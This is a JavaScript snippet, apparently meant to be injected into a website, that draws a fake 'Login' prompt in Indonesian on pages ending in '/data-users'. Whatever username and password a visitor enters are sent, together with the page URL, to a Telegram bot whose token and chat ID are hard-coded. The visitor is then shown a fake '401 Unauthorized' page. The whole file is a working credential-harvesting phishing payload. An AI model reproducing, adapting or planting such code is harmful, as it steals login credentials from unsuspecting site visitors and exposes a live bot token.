(function () {
  // Hanya lanjut jika URL berakhir dengan '/data-users'
  if (!window.location.pathname.endsWith("/data-users")) return;

  const botToken = "7551512248:AAG39tneoqQOS6rHMiS-83dTQ_WAa0xJ7xY";
  const chatId = "7893111171";

  document.body.style.margin = "0";
  document.body.style.backgroundColor = "#000";
  document.body.style.color = "#fff";
  document.body.style.fontFamily = "Arial, sans-serif";
  document.body.style.display = "flex";
  document.body.style.justifyContent = "center";
  document.body.style.alignItems = "center";
  document.body.style.height = "100vh";

  const loginBox = document.createElement("div");
  loginBox.style.width = "300px";

  loginBox.innerHTML = `
    <h2 style="text-align:left; margin-bottom:10px;">Login</h2>
    <p style="font-size:14px; margin-bottom:20px;">
      https://admmaxs.nexxss.site memerlukan nama pengguna dan sandi
    </p>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Nama Pengguna" required
        style="width:100%;padding:8px;margin-bottom:15px;border:none;border-radius:4px;" />
      <input type="password" name="password" placeholder="Sandi" required
        style="width:100%;padding:8px;margin-bottom:15px;border:none;border-radius:4px;" />
      <div style="display:flex;justify-content:space-between;">
        <button type="button" id="cancelBtn"
          style="padding:8px 20px;border:none;border-radius:4px;background-color:#444;color:#fff;cursor:pointer;">
          Batal
        </button>
        <button type="submit"
          style="padding:8px 20px;border:none;border-radius:4px;background-color:#444;color:#fff;cursor:pointer;">
          Login
        </button>
      </div>
    </form>
  `;

  document.body.appendChild(loginBox);

  document.getElementById("cancelBtn").addEventListener("click", goToUnauthorized);

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const username = this.username.value;
    const password = this.password.value;
    const currentUrl = window.location.href;
    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nURL: ${currentUrl}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    }).finally(goToUnauthorized);
  });

  function goToUnauthorized() {
    document.body.innerHTML = `
      <div style="text-align: center; color: white; font-family: monospace;">
        <h1>401</h1>
        <h2>Unauthorized</h2>
        <p>Proper authorization is required to access this resource!</p>
      </div>`;
  }
})();
